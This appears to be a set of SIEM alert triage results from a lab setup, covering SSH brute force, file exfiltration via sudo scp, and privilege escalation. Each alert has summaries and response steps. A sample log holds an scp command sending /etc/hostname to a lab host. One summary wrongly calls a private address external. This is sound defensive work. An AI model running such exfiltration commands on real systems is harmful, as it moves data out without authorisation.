case.rule_description: Custom SSH Brute Force: 6 failed password attempts from the same source IP within 120 seconds.

suggestion.summary: Multiple failed SSH login attempts from an unauthorized internal IP indicate a potential brute force attack targeting the victim user.
evidence: 6 failed password attempts from the same source IP within 120 seconds
recommended_actions: Block IP 192.168.56.103 at the firewall or Wazuh response engine.
Verify if the user 'victim' is a legitimate service account or requires password reset.
Review other accounts on the target for similar brute force activity.

case.rule_description: Possible Data Exfiltration: file transfer tool executed with sudo.
sample_logs: Nov 14 15:05:54 ubuntu-victim2 sudo[5265]: victim2 : TTY=/dev/pts/0 ; PWD=/home/victim2 ; USER=root ; COMMAND=/usr/bin/scp /etc/hostname victim@192.168.56.111:/tmp/
Nov 14 15:06:32 ubuntu-victim2 sudo[5281]: victim2 : TTY=/dev/pts/0 ; PWD=/home/victim2 ; USER=root ; COMMAND=/usr/bin/curl --version

suggestion.summary: The logs show a user executing sudo to transfer sensitive system files (hostname) and run commands via SCP and curl to an external IP, indicating active data exfiltration.
evidence: MITRE T1048: Exfiltration Over Alternative Protocol
recommended_actions: Block outbound traffic to IP 192.168.56.111 immediately.
Isolate agent ubuntu-victim2 from the network.
Review user 'victim2' permissions and audit recent file access.

case.rule_description: Possible Privilege Escalation: root shell opened via sudo.

suggestion.summary: A user 'victim' successfully escalated privileges to root using sudo to invoke the su command, indicating a confirmed privilege escalation attempt.
evidence: rule_description: Possible Privilege Escalation: root shell opened via sudo.
recommended_actions: Verify if the 'victim' user has legitimate administrative tasks requiring this specific command.
Review sudoers configuration to ensure the escalation method is not overly permissive.
Check for subsequent malicious activity or lateral movement from the root shell.
